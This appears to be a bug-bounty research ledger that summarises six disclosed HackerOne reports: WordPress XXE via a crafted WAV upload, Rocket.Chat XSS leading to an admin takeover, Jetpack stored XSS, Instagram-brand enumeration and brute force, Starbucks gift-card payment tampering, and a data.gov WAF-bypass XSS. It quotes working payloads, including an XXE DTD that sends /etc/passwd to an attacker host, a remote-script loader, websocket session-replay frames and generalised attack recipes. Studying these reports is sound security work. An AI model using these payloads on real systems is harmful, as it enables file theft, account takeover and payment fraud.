SOURCE: https://hackerone.com/reports/1095645  2026-11-12
ROUTE: live `https://hackerone.com/reports/1095645.json` = HTTP 200, `visibility: full`, `vulnerability_information` 3,062 chars read IN FULL (researcher summary also present in the same `.json`, pointing to the credited advisory blog.sonarsource.com/wordpress-xxe-security-vulnerability). Metadata: WordPress core, "Authenticated XXE", reporter `sonarsource`, submitted 2021-02-04, disclosed 2021-05-18, weakness XML External Entities (XXE), severity medium, resolved.
STATUS: UNVERIFIED (not reproduced — no WordPress/PHP-8 lab was stood up this pass; every quote below is verbatim from the fetched report body).
CLASS: XXE (CWE-611) via AUTHENTICATED FILE UPLOAD — the media library's metadata extractor parses XML smuggled inside a NON-XML media container (`.wav`), and on PHP 8 the code's XXE guard was removed while the parser still runs with `LIBXML_NOENT`, which re-enables entity substitution.
CORE METHOD:
  1. THE SINK (report verbatim): "The WordPress core Media Library does not securely parse XML content when running on PHP 8"; requirements (verbatim): "latest WordPress 5.6 installation / running on PHP 8 / *author* user privileges in WordPress, or higher / another web server that is controlled by the attacker to retrieve leaked data".
  2. THE CARRIER (report verbatim): "The vulnerability can be exploited by uploading a crafted .wav file" — the XML lives INSIDE the audio container: "For the .wav file, the address has to be adapted at `0x000338CD` (best use a hex editor for this...)" (the attacker-server URL patched at a fixed offset in the WAV), and "Put the file *xxe.dtd* at the root of the webserver that you control."
  3. THE TRIGGER (report verbatim): "Login to WordPress as author and upload *xxe.wav* in the media library. The content of */etc/passwd* will appear in the access logs of the web server base64 encoded" — OOB parameter-entity exfil delivered into the attacker's own access log.
  4. THE ROOT CAUSE (report verbatim, the vulnerable code, cited to the WordPress commit 03eba7beb2f5b96bd341255eaa30d6b612e62507): `if (PHP_VERSION_ID < 80000) { $loader = libxml_disable_entity_loader(true); } $XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);` — "It was recently modified to accommodate for the deprecation of the `libxml_disable_entity_loader()` function in PHP 8. The mistake here is to rely on the fact that XXE is no longer possible by default in PHP 8 (as it requires libxml version > 2.9). This is true, but using the `LIBXML_NOENT` flag is certainly not the default. The flag explicitly activates entity substitution (the name of the flag might be a little misleading). So if user input reaches that point as part of the `$XMLstring` variable, XXE is possible."
  5. THE IMPACT SET (report verbatim): read "secret system files, such as *.htaccess* or *wp-config.php*"; DoS "by loading */dev/urandom* via XXE"; "fingerprint and exploit services in the internal network by turning the XXE into SSRF"; "trigger a Phar Deserialization by using the `phar://` stream wrapper within the XXE which can lead to further vulnerabilities, depending on the gadget chains available".
DETECTION SIGNAL: white-box — any PHP XML parse call (`simplexml_load_string`, `DOMDocument::loadXML`, `XMLReader`) carrying `LIBXML_NOENT` where the `libxml_disable_entity_loader()` guard sits inside `if (PHP_VERSION_ID < 80000)` or was deleted outright (PHP-8 modernization commits are the hot spot) with user-influenced `$XMLstring`; black-box — an upload/metadata-extraction path that accepts a media/document container and your OAST host receives an HTTP fetch of an `.dtd` right after the upload; the tell is XML hiding inside a NON-XML container (RIFF/WAV, ID3, image metadata, office parts).
CHAIN: author-role account uploads a crafted `.wav` (primitive: any authenticated low-priv user can upload media) -> the metadata extractor parses the embedded XML with `LIBXML_NOENT` on PHP 8 (primitive: entity substitution re-enabled by the FLAG despite libxml>=2.9 defaults) -> external DTD from the attacker server, nested parameter entity reads `file:///etc/passwd` / `wp-config.php` / `.htaccess` (impact: arbitrary server-side file read incl. DB credentials) -> the same entity aims at internal URLs (escalation: SSRF -> internal service fingerprint/exploitation) or at `phar://` (escalation: Phar deserialization -> RCE per available gadgets). Per doctrine §8: precondition = author-role account + attacker-reachable OAST server; gain = secret file read + SSRF + a deserialization path. Program rating: medium.
TRANSFERABLE TEST: (1) grep every `LIBXML_NOENT` / `simplexml_load_string` / `loadXML` call site and check whether the entity-loader guard is version-gated or deleted; (2) upload a non-XML container (`.wav`/`.jpg`/`.docx`) carrying `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<OAST>/x.dtd"> %xxe;]>` in its metadata and watch the OAST log; (3) host the external DTD with a nested parameter entity (`<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<OAST>/?d=%data;'>"> %eval; %exfil;`) and read the file out of your access log; (4) repeat the entity at `http://127.0.0.1:<port>/` and `phar://<uploaded-file>` for the SSRF/deserialization legs. Rule: **`LIBXML_NOENT` re-enables entity substitution even under modern libxml defaults — audit the FLAG, not the deprecated function, and remember the XML can hide inside a media container's metadata.**
DEDUPE/DELTA: `1095645`, `sonarsource`, `libxml_disable_entity_loader`, `xxe.wav`, `0x000338CD`, `CVE-2021-29447` = 0 as recorded techniques (`LIBXML_NOENT` appears only inside the #415501 CTF POP-chain gadget description, ledger ~15128 — a deserialization gadget, not an upload-surface code signal). Related-but-distinct REVIEWED and NOT re-recorded: §17.204 / #334488 (Open-XChange blind XXE via `.pptx` OOXML package part, FTP-exfil DTD — class owner: upload -> document parser -> OOB DTD exfil) and §17.295 / #347139 (Rockstar SVG->PNG XInclude/entity SSRF + `//` filter bypass). NEW DELTAS: (a) a NON-XML media container (`.wav` metadata) as the XML carrier; (b) the PHP 8 `libxml_disable_entity_loader()` REMOVAL trap + `LIBXML_NOENT` as the white-box detection signal; (c) delivery of the `phar://` deserialization leg THROUGH the XXE (the `phar://` metadata-deserialization primitive itself is already in the playbook, Bugbountyskills ~6487/7322). New general method -> §17.623.
FRESHNESS: submitted 2021-02-04 / disclosed 2021-05-18 — OUTSIDE the preferred 6-12 month window (~5.5 years); read because assigned. The method (LIBXML_NOENT + PHP-8 guard removal; XML smuggled in media metadata) is code-level and re-detectable on every PHP XML-parser and media-upload surface.

SOURCE: https://hackerone.com/reports/735638  2026-11-12
ROUTE: live `https://hackerone.com/reports/735638.json` = HTTP 200, `visibility: full`, `vulnerability_information` 3,487 chars read IN FULL (team summary — AutoLinker+Markdown breakout, fix released for 3.11 / 3.10.5 / 3.9 — read from the same `.json`). Metadata: Rocket.Chat, "Account takeover via XSS", reporter `sectex`, submitted 2019-11-11, disclosed 2021-03-31, weakness Cross-site Scripting (XSS) - Stored, severity critical, resolved.
STATUS: UNVERIFIED (not reproduced — no Rocket.Chat instance was stood up this pass; every quote and request frame below is verbatim from the fetched report body).
CLASS: stored XSS via PARSER-COMPOSITION attribute breakout -> account takeover + privilege escalation (the documented chain: JS-storage session-token theft -> realtime-RPC session replay -> role assignment).
CORE METHOD:
  1. THE PRIMITIVE (report verbatim): "By combining AutoLinker and Markdown an attacker is able to inject malicious scripts ... By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute." Payload (verbatim): ``https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)`` — markdown link syntax plus a URL token the autolinker promotes to an anchor (raw text copied into the anchor's attributes); the smuggled `style`/`onanimationiteration` attributes break out of the rendered HTML attribute (the report's rendered-HTML diff shows the breakout).
  2. THE NO-PAREN/NO-QUOTE EVAL GADGET (report verbatim): `onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'CODE'instanceof[]` — the CSS animation loop re-fires the handler; the handler overwrites `Array.prototype[Symbol.hasInstance]` with `eval`, then `instanceof[]` makes the string literal the `hasInstance` argument -> `eval('CODE')`. The weaponized payload swaps in a remote-script loader (`s=document.createElement\x28\x27script\x27\x29;s.src='https://sectex.dev/files/cswsh.js';document.body.appendChild\x28s\x29;`).
  3. THE SESSION PRIMITIVE (report verbatim): "To obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`. Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.)."
  4. THE REPLAY + PRIVESC (report verbatim code): `new WebSocket('wss://<host>/sockjs/111/evilwss/websocket')`; answer the sockjs handshake (on the `server_id` frame send `["{\"msg\":\"connect\",\"version\":\"1\",\"support\":[\"1\",\"pre2\",\"pre1\"]}"]`), then login with `["{\"msg\":\"method\",\"method\":\"login\",\"params\":[{\"resume\":\"<localStorage.getItem('Meteor.loginToken')>\"}],\"id\":\"1\"}"]`; on `connected`, call `["{\"msg\":\"method\",\"method\":\"insertOrUpdateUser\",\"params\":[{\"_id\":\"{ATTACKER_USERID}\",\"email\":\"{ATTACKER_EMAIL}\",\"password\":\"\",\"roles\":[\"user\",\"admin\"],...}],\"id\":\"17\"}"]` — "In this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions."
  5. DESKTOP ESCALATION (report verbatim impact): "Account takeover / Abitrary file read in Rocket.Chat-Desktop / RCE in Rocket.Chat-Desktop (#276031)".
DETECTION SIGNAL: a chat/markdown surface where TWO renderers run in sequence (linkifier + formatter) and the first copies raw text into an anchor ATTRIBUTE (`title=`, `href=`); for the token leg: the client keeps its session in JS-reachable storage (`Meteor.loginToken` / `localStorage` / non-HttpOnly cookie) and exposes a realtime RPC (SockJS/DDP/WebSocket) accepting a `resume`/token login; the payload tell is an event-handler attribute landing OUTSIDE the intended anchor.
CHAIN: any user posts markdown (primitive: stored content on a shared surface) -> AutoLinker+Markdown composition breaks out of the anchor attribute (primitive: stored XSS executing for every viewer, incl. admins) -> payload reads `localStorage.getItem('Meteor.loginToken')` (escalation: full session token — JS storage defeats HttpOnly) -> `resume`-login over the SockJS websocket as the victim (escalation: attacker-driven realtime session; "we can perform any actions in the context of the victim (change password, email etc.)") -> `insertOrUpdateUser` with `roles:["user","admin"]` (impact: attacker account promoted to admin = ATO + privilege escalation; desktop client variant -> arbitrary file read -> RCE). Per doctrine §8: precondition = victim views the attacker's markdown and the app stores its session token in JS storage; gain = all victim-session actions + admin role assignment. Program rating: critical.
TRANSFERABLE TEST: on any markdown+autolink surface post ``[ ](https:// style=x:1; onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x281\x29;'instanceof[] target=_blank data-x=`.`)`` and diff the rendered HTML for smuggled attributes outside the anchor; once script runs, dump every JS-storage token (`localStorage`, `sessionStorage`, `document.cookie`), find the app's realtime socket (`/sockjs/`, `/websocket`), replay a `resume`/token login, and enumerate its user/role-update methods (`insertOrUpdateUser`-style) with `roles:["user","admin"]` (or your own userId). Rule: **the XSS is the first link — the payoff is replaying the JS-storage session token over the app's own realtime RPC and calling the role-assignment method; test the WS plane even when REST cookies are HttpOnly.**
DEDUPE/DELTA: `735638`, `sectex`, `onanimationiteration`, `hasInstance`, `Meteor.loginToken`, `insertOrUpdateUser`, `evilwss` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the autolinker attribute-injection FAMILY (the primitive) is recorded from #299728 (`_`/`@` bogus-tag trick) + #46072 (escape-stage) + #46916 (adjudicated duplicate) — per the CHAIN-ONLY rule the primitive is recorded here only as the first link of the documented chain; dust.tt #3115705 (§17.330) chains stored XSS -> REST `POST /api/w/<ws>/members/<id> {"role":"admin"}` with `credentials:'include'` — same impact over the REST plane with cookie auth, while this entry's plane is the REALTIME RPC with a stolen `resume` token (works past HttpOnly cookies and CSRF-protected REST); §17.345 (Rocket.Chat DDP `autoTranslate.translateMessage` IDOR) records DDP as a second AUTHORIZATION surface for object access, not as a session-replay/privesc plane; the Jamf Swagger `configUrl` entry (ledger ~2988) reads `localStorage.authToken` for passive ATO but drives no RPC. NEW DELTAS: (a) the `Symbol.hasInstance`/`onanimationiteration` eval gadget as the attribute-breakout payload shape; (b) "steal JS-storage session token -> `resume`-login over SockJS/WebSocket -> call the user-update method with attacker-supplied roles" escalation. New general method -> §17.624.
FRESHNESS: submitted 2019-11-11 / disclosed 2021-03-31 — OUTSIDE the preferred 6-12 month window (~5.6 years); read because assigned. The method (realtime-RPC session replay + role assignment after XSS) is stack-level and re-detectable on every Meteor/DDP/localStorage-token app.

SOURCE: https://hackerone.com/reports/402753  2026-11-12
ROUTE: live `https://hackerone.com/reports/402753.json` = HTTP 200, `visibility: full`, `vulnerability_information` 5,673 chars read IN FULL. Metadata: Automattic, "Stored XSS in Jetpack's Simple Payment Module by Contributors / Authors", reporter `simonscannell`, submitted 2018-08-30, disclosed 2019-12-19, weakness Cross-site Scripting (XSS) - Stored, severity medium, resolved.
STATUS: UNVERIFIED (not reproduced — no WordPress/Jetpack instance was stood up this pass; every quote below is verbatim from the fetched report body).
CLASS: stored XSS with privilege-escalation impact via WordPress CUSTOM-POST-TYPE CAPABILITY MISCONFIGURATION — the Simple Payment product CPT's `capabilities` map points at the default editing caps, so contributors/authors can CREATE the privileged product object; its post-meta keys are unprotected (arbitrary values via creation or `wp_ajax_add_meta`); and the `[simple-payment]` shortcode renderer echoes the meta (`spay_formatted_price`) unsanitized.
CORE METHOD:
  1. THE CAPABILITY GAP (report verbatim): `$product_capabilities = array('edit_post' => 'edit_posts', 'read_post' => 'read_private_posts', 'delete_post' => 'delete_posts', 'edit_posts' => 'edit_posts', 'edit_others_posts' => 'edit_others_posts', 'publish_posts' => 'publish_posts', 'read_private_posts' => 'read_private_posts'); ... register_post_type( self::$post_type_product, $product_args );` with `'show_in_rest' => true` — "As can be seen, the capabilities of a product are explicitly set to 'edit_post'. This means contributors and authors have access to these products and can create them in the database."
  2. THE META WRITE (report verbatim): "Since none of the post_meta keys are protected, it is also possible for contributors and authors to fill them with arbitrary values. (Either when creating the post or via the wp_ajax_add_meta handler)." The product meta set (report's own code comment): `spay_price - price / spay_formatted_price / spay_currency - currency code / spay_cta / spay_email - paypal email / spay_multiple / spay_status`.
  3. THE SINK (report verbatim): `output_shortcode()` returns `<div class='${css_prefix}-price'><p>{$data['price']}</p></div>` — "This line here was particularly interesting to me, as the price is outputted unsanitized."
  4. THE READ PATH (report verbatim): `parse_shortcode()` does `$data['price'] = $this->format_price(get_post_meta($product->ID, 'spay_formatted_price', true), get_post_meta($product->ID, 'spay_price', true), get_post_meta($product->ID, 'spay_currency', true), $data);` and `format_price()` "does not perform any sanitization whatsoever": `if ( $formatted_price ) { return $formatted_price; } return "$price $currency";`
  5. THE TRIGGER AND IMPACT (report verbatim): any post embedding `[simple-payment id="17"]` renders the payload for every viewer (PoC video linked in the report); impact verbatim: "Since Stored XSS easily leads to a privilege escalation in WordPress, this is still of high impact."
DETECTION SIGNAL: a plugin registering a custom post type with `'capabilities' =>` mapped onto DEFAULT role caps (`edit_posts`, `edit_others_posts`, `publish_posts`) so the lowest content roles can create that type; unprotected meta keys (no `is_protected_meta`, no `_`-prefix); a frontend renderer (shortcode/block/template) echoing `get_post_meta()` output raw. Black-box tell: a Contributor/Author account can create the privileged object type and set a field that later appears unescaped on a public page.
CHAIN: contributor/author account (lowest content role) -> creates the product CPT post and sets `spay_formatted_price` (or any echoed meta) to an HTML payload via post creation or `wp_ajax_add_meta` (primitive: arbitrary meta write on a low-priv-creatable object) -> a published post embeds `[simple-payment id=<post_id>]` and `format_price()` returns the raw meta (escalation: attacker meta value echoed into `<p>{$data['price']}</p>` with no escaping) -> stored XSS executes for every viewer incl. admins (impact: session theft -> WordPress privilege escalation to admin; program rating medium, weakness XSS Stored). Per doctrine §8: precondition = a Contributor/Author-role account (or any role the CPT caps grant) and a viewer loading the embedding post; gain = JS execution in every viewer's session, admin session theft -> ATO/privesc.
TRANSFERABLE TEST: on every WordPress app with plugins registering CPTs: (1) enumerate CPTs (`GET /wp-json/wp/v2/types`, or `register_post_type` in plugin/theme source) and read each `'capabilities'` map — any cap pointing at `edit_posts`-class roles means the lowest content roles author that type; (2) as Contributor/Author create one such object and write EVERY meta key (business fields like `spay_price`; use the meta box, `wp_ajax_add_meta`, or REST) with `<img src=/nonexistent onerror=alert(1)>`; (3) publish a post embedding the object's shortcode/block and load it logged-out — the raw payload in the HTML = stored XSS; (4) if that field renders escaped, diff the sibling renderer fields (title, description, CTA text, currency). Rule: **a custom post type's `capabilities` map is an authorization boundary — when it points at the default editing caps, the lowest content role becomes an author of privileged objects, and any unprotected meta it can write is a stored-XSS candidate wherever a renderer echoes it.**
DEDUPE/DELTA: `402753`, `simonscannell` (as this report's author), `simple-payment`, `spay_`, `wp_ajax_add_meta`, `jetpack`, `custom post type` + `is_protected_meta` = 0 technique hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.507 / ledger ~15295 (a plugin's private-content CPT REST-exposed with NO READ gate — unauthenticated private-data READER; the defect is a missing REST read ACL, not a capability map granting low-priv CREATE plus an echo sink); §17.117 (a `wp_ajax_nopriv` preview that EXPANDS shortcodes from a request parameter — shortcode INPUT injection into ORDER BY SQLi, not meta VALUE injection into rendered HTML); #509930 (§17.307 `wp_targeted_link_rel` — a sanitizer's own rewrite injecting the delimiter). NEW DELTA: the CPT `capabilities` map as the privilege boundary + unprotected post meta as the low-priv write primitive + shortcode renderer as the raw echo — one chain from the lowest content role to stored XSS. New general method -> §17.625.
FRESHNESS: submitted 2018-08-30 / disclosed 2019-12-19 — OUTSIDE the preferred 6-12 month window (~7 years); read because assigned; the method (CPT capability map + unprotected meta + renderer echo) is plugin-structure-level and re-detectable on any WordPress install.

SOURCE: https://hackerone.com/reports/209008  2026-11-12
ROUTE: live `https://hackerone.com/reports/209008.json` = HTTP 200, `visibility: full`, `vulnerability_information` 4,802 chars read IN FULL. Metadata: Automattic, "Authentication Bypass - Chaining two vulnerabilities leads to account takeover at en.instagram-brand.com", reporter `saurabhb`, submitted 2017-02-26, disclosed 2019-06-22, weakness Improper Authentication - Generic, severity high, resolved.
STATUS: UNVERIFIED (not reproduced — no request was sent to the target this pass; every request line and quote below is verbatim from the fetched report body).
CLASS: authentication bypass / ATO chain — unauthenticated user enumeration + forced re-verification ACCOUNT LOCKOUT via an unthrottled verification-resend endpoint, chained with an unthrottled REST login into credential-guessing account takeover (the report's own framing: "Chaining two vulnerabilities leads to account takeover").
CORE METHOD:
  1. THE CONTROL GAP (report verbatim): enumeration is blocked "by implementing CAPTCHAs at Sign Up (https://en.instagram-brand.com/register/signup) and Forgot Password pages... But I have found a way to bypass this protection. The endpoint: https://en.instagram-brand.com/wp-json/brc/v1/resend-verify has absolutely no rate limiting, thus a malicious user can take its advantage to enumerate usernames."
  2. THE ORACLE REQUEST (report verbatim): `POST /wp-json/brc/v1/resend-verify HTTP/1.1` / `X-WP-Nonce: 30436dbdab` / `Content-Type: application/x-www-form-urlencoded` / `Cookie: pll_language=en; ...` / body `email=<your email here>` — "Observe the response. It is verbose and states clearly if the user exists or not." Volume (report verbatim): "The total number of requests/attempts you were able to make - 1001 (you can do it infinite)" in 10 minutes.
  3. THE STATE-FLIP / LOCKOUT (report verbatim): "if a valid username is found, then the Instagram site sends an account verification link to that email. Even if the account is previously verified !! And if those victims try to login, then they can't. The site asks to first verify their account by clicking on the account activation links !!!" — the enumeration pass itself flips every VALID account it touches into must-re-verify state (targeted lockout + inbox flooding of the victim).
  4. THE BRUTE-FORCE LINK (report verbatim): `https://en.instagram-brand.com/wp-json/brc/v1/login/` "does not have any rate limiting. This still allows an attacker to make the following number of guesses from one single system single threaded : 100 per min, 6,000 per hour, 1,44,000 per day or 43,20,000/month. No additional protection mechanism such as Captcha (pre-auth) or account lockout requiring additional email/phone verification (pre- or post-auth) were identified at any time. I could make 1020 attempts in 10 minutes." (Report exploits: `InstagramBrandEnumerationExploit.rb` + `email.txt`, then `InstagramBrandLoginBruteForce.rb` + `passlist.txt` with the victim email from the enumeration output.)
DETECTION SIGNAL: an app whose anti-enumeration / anti-automation controls (CAPTCHA, throttling) exist on the UI flows (signup, forgot-password) but NOT on the API endpoints performing the adjacent lookups (`/wp-json/<ns>/resend-verify`, `/api/verify`, resend-invite); a resend-verification endpoint with a verbose existence response; a verified account that can be pushed back to unverified by a third party. TELL: the response "states clearly if the user exists or not", and a known-good login after the resend fails with a "verify your account first" wall.
CHAIN: attacker runs the resend-verify request over an email list (primitive: unauthenticated user-existence oracle with no rate limit — the UI CAPTCHA never touches it) -> every valid account is forced back to unverified and its owner locked out of login (escalation: targeted account lockout — the victim cannot log in to rotate credentials or notice the attack; the same action floods the victim inbox) -> the co-located `/wp-json/brc/v1/login/` accepts unlimited single-threaded guesses (escalation: no captcha/lockout/step-up at any point) -> password cracked for a harvested account -> full account takeover at scale (impact: ATO; program rating high, weakness Improper Authentication). Per doctrine §8: precondition = open signup to obtain a session/`X-WP-Nonce` + a password list; gain = any enumerated account's full access. The mail-flooding/harassment leg alone is doctrine §2(d) ineligible — the reportable impact is the ATO chain.
TRANSFERABLE TEST: on every app with verification-resend / invite-resend / forgot-password endpoints: (1) map where anti-enumeration controls actually sit (CAPTCHA on signup/forgot-password UI) and probe the API TWINS of the same lookup unauthenticated (`/wp-json/<ns>/resend-verify`, `/api/verify`, `/users/resend`); (2) diff valid vs invalid address responses (status/JSON/message) — an existence oracle with no throttle = the harvest step; (3) on an OWNED already-verified account fire the resend and try to log in — a forced "verify first" wall = third-party account-lockout primitive; (4) check the login endpoint for captcha/lockout/step-up and prove the chained ATO only with a small, program-approved attempt count. Rule: **anti-enumeration and anti-automation controls implemented on UI flows do not cover the API twin of the same action — and a "resend verification" endpoint is a triple primitive: existence oracle, inbox flood, and a verified→unverified flip that locks the owner out.**
DEDUPE/DELTA: `209008`, `resend-verify`, `InstagramBrandEnumerationExploit`, `InstagramBrandLoginBruteForce`, `brc/v1/login` = 0 as recorded techniques (the `brc/v1` grep hits are the #1007988 nested-route IDOR entry §17.458 — different report, different defect). Related-but-distinct REVIEWED and NOT re-recorded: §17.462 (Rockstar — a login limiter EXISTS and is defeated by rotating `X-Forwarded-For`; same chain shape "unlimited attempts -> brute force -> ATO" but its delta is the CAPTCHA-keying bypass, while here no control exists at all on the API twin); #410451 (batch 225 — bare "login has no rate limiting", adjudicated SKIPPED as doctrine §2(c)/§2(d) "nothing beyond the recorded brute-force material"; this entry's content is the RESEND-VERIFY triple primitive and the control-coverage gap, not the missing limiter); §17.460 (a WordPress REST account-existence oracle — null-vs-empty response on a login-check route, chain stops at a validated account list); the Mail.ru SMS-bruteforce family (ledger ~8632/8797) and Grab `profileActivationCode` (ledger ~15171) brute OTP/codes, not passwords chained to a lockout oracle. NEW DELTAS: (a) the verification-resend endpoint as a triple primitive (existence oracle + inbox flood + verified→unverified lockout), (b) the UI-CAPTCHA-vs-API-twin control-coverage gap as the enumeration bypass. New general method -> §17.626.
FRESHNESS: submitted 2017-02-26 / disclosed 2019-06-22 — OUTSIDE the preferred 6-12 month window (~7 years); read because assigned; the method (API twins of UI-gated lookups; resend-verify state flip) is feature-level and re-detectable on any signup/verification surface.

SOURCE: https://hackerone.com/reports/316789  2026-11-12
ROUTE: live `https://hackerone.com/reports/316789.json` = HTTP 200, `visibility: full`, `vulnerability_information` 2,144 chars read IN FULL. Metadata: Starbucks, "Able to purchase a gift card with any amount", reporter `qwacsawd`, submitted 2018-02-16, disclosed 2018-07-20, weakness Insecure Direct Object Reference (IDOR) tag / payment business-logic, severity high 8.3, asset card.starbucks.com.sg, resolved.
STATUS: UNVERIFIED (not reproduced — no Starbucks request was sent this pass; every request/parameter below is verbatim from the fetched report body).
CLASS: business-logic payment/amount tampering with an ENCODED AMOUNT-TOKEN TRANSPLANT (monetary impact) — multi-parameter amount-consistency bypass + minting the payment gateway's encrypted `vpc_Amount` blob under an attacker-chosen low value in a throwaway flow and splicing it into the high-value order.
CORE METHOD:
  1. THE ENTRY FLOW (report verbatim): `https://card.starbucks.com.sg/egift/cards.php?cat=Singapore%20Exclusive` — "Fill in the relevant values, set the emails to your starbucks account email and the input value to $300 at the start" then "click on the check out button" under a proxy.
  2. THE TOKEN MINT (report verbatim): "Change the original values of the request from `txtAmount=300&amount=300&txtCustomAmount=300` to `txtAmount=0.1&amount=0.1&txtCustomAmount=0.1` and submit the request" — then "An encoded string of the value 0.1 will be displayed in the following request as `vpc_Amount=XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D`, where `=XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D` is the value 0.1"; "Copy that string and drop the entire request."
  3. THE CONSISTENCY BYPASS (report verbatim): "Repeat step 1 to 4, this time change ONLY the value in the variable \"amount\" so the request would look like this: `txtAmount=300&amount=300&txtCustomAmount=300` to `txtAmount=300&amount=0.1&txtCustomAmount=300`" — the display fields keep 300 while the charged field is 0.1; the flow proceeds from `https://card.starbucks.com.sg/egift/checkout.php` to `https://card.starbucks.com.sg/egift/payment.php`.
  4. THE TRANSPLANT (report verbatim): at payment.php "where the vpc_Amount is showed in the request. Change the original vpc_Amount value to the copied string `XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D`"; "Continue payment as per usual and you will be paying $0.1 for a $300 starbucks card."
  5. THE REDEEM (report verbatim): "Since the recipient email is the attacker's email he checks his email to redeem the card and adds it into his starbucks account... The attacker now has a $300 starbucks gift card that he only paid $0.1 for." Impact verbatim: "By abusing this function, an attacker could gain unlimited values for his starbucks card."
DETECTION SIGNAL: a checkout/gift-card/top-up flow carrying a server-encrypted/encoded AMOUNT field (`vpc_Amount`-class: `encParams`, `secureHash`, `x_amount`, `vpc_*`) whose plaintext the attacker chooses by driving the flow; several amount parameters that must agree (`txtAmount`/`amount`/`txtCustomAmount`, `amount`/`total`/`price`) where mutating only the charged one still proceeds; the tell — the same encoding of the attacker's chosen value appears in a later request, so the token can be minted on demand and carried across flows/sessions.
CHAIN: attacker starts a $300 egift order to their own email (primitive: attacker chooses order face value and recipient) -> submits all amount fields as 0.1 and captures the gateway's encoded `vpc_Amount` for 0.1 (primitive: the app mints a valid amount token for any value the flow can carry) -> discards the request, starts a fresh $300 order and mutates ONLY `amount=0.1` while `txtAmount`/`txtCustomAmount` stay 300 (escalation: the internal amount-consistency check is passed by leaving the display fields untouched) -> pastes the 0.1-encoded blob over `vpc_Amount` at payment.php (escalation: the gateway decrypts the transplanted token and charges 0.1 — the token is bound to the AMOUNT, not to the ORDER) -> pays $0.10, receives and redeems a $300 gift card (impact: monetary loss at scale — "unlimited values for his starbucks card"; program rating high 8.3). Per doctrine §8: precondition = an open egift purchase flow (no special role); gain = arbitrary stored value for a minimum payment.
TRANSFERABLE TEST: on every checkout/gift-card/top-up flow with an encoded/encrypted amount field: (1) drive the flow once with a MINIMAL value and capture the encoded amount token; (2) drive it again with the real value, mutating ONLY the charged amount field (leave the display fields) and diff which fields the server cross-checks; (3) transplant the minimal-value token into the real-value request at the payment step and complete a sandbox/test-card payment; (4) if the token verifies, the charge is decoupled from the order face value — pay the minimum for the maximum face value; also run the single-field probes on the same request (`amount=0`, `-1`, `0.01`, float forms). Rule: **an encrypted amount parameter proves only that THE AMOUNT was not tampered with in transit — it does not bind the amount to the ORDER; mint the token in a throwaway flow and transplant it into the real one.**
DEDUPE/DELTA: `316789`, `qwacsawd`, `vpc_Amount`, `txtAmount`, `txtCustomAmount`, `card.starbucks.com.sg` = 0 hits across the three write targets (the `vpc` grep hits are AWS VPC text; the lone `gift card` hit is the stock-generation detection-signal enumeration at ledger ~2313). Related-but-distinct REVIEWED and NOT re-recorded: V-01 (price/quantity/currency VALUE tampering — its test mutates `unit_price`/`quantity` IN THE REQUEST, no encoded token exists) and V-10 (negative-value credit generation); the signed-request boundary-shift entry (ledger ~3127 — parameter SMUGGLING into a signed string by renaming fields so the canonical concatenation is unchanged; a signature bypass, not an app-minted token carried across flows); the create→capture value re-supply family (ledger ~6375/22515 — the second request restates the value because the STORED order never binds it; here the value IS signed by the gateway but the signature covers only the amount, so the transplant happens at the token layer). NEW DELTAS: (a) the app's own encryption as the amount-token MINT (choose the plaintext by driving the flow), (b) the cross-request/cross-flow TRANSPLANT of that token, (c) the multi-amount-field split (display fields keep the face value, only the charged field is mutated) to pass internal consistency checks. New general method -> §17.627.
FRESHNESS: submitted 2018-02-16 / disclosed 2018-07-20 — OUTSIDE the preferred 6-12 month window (~8 years); read because assigned; the method (encoded amount-token mint + transplant on payment-gateway integrations, `vpc_Amount`-class parameters) is integration-level and re-detectable on every payment flow carrying an encrypted amount.

SOURCE: https://hackerone.com/reports/263226  2026-11-12
STATUS: UNVERIFIED (not reproduced). CLASS: reflected XSS via query-parameter ATTRIBUTE BREAKOUT + WAF bypass (UNKNOWN TAG NAME + Firefox-only bubbling event handler). GSA Bounty / data.gov, reporter `sp1d3rs`, submitted 2017-08-25, disclosed 2017-09-15, medium; live `.json` `visibility: full`, VI 861 chars read IN FULL.
CORE METHOD: (1) `?media_url=` lands in a quoted HTML attribute; the PoC closes it with `%22%3E` (`">`) and appends `<svg>…</svg>` ("POC (HTML injection)"). (2) Verbatim: "At the srart i was not able to do the XSS due to Akamai Waf XSS filters, but later, i was able to bypass it." (3) The bypass ("POC (Reflected XSS)", "Use this link in the Mozilla Firefox"): `?media_url=…%22%3E%3C/div%3E%3C/div%3E%3Cbrute%20onbeforescriptexecute=%27confirm(document.domain)%27%3E` — an UNCLOSED unknown element `<brute onbeforescriptexecute='…'>`; the page's own `<script>`s nest inside it and Firefox's bubbling `onbeforescriptexecute` fires the handler.
DETECTION SIGNAL: reflected embed/media param in an attribute; WAF blocks `onerror`/`onload`/`<script>`/`<svg` while `%22%3E` still renders injected HTML (injection works, handlers filtered).
CHAIN: victim opens the link in Firefox -> attribute breakout -> HTML injection (P4) -> unknown-tag + unlisted-handler WAF bypass -> XSS in `www.data.gov` origin (medium).
TRANSFERABLE TEST: prove breakout with `%22%3E`+inert element; when known tags/handlers are filtered, use an UNKNOWN tag name with an unlisted handler — Firefox: `onbeforescriptexecute='CODE'` on an UNCLOSED unknown tag makes the page's own scripts the trigger. Rule: **a WAF filtering known tags+handlers still passes unknown tag names, and an unclosed custom element turns the page's own scripts into the event source.**
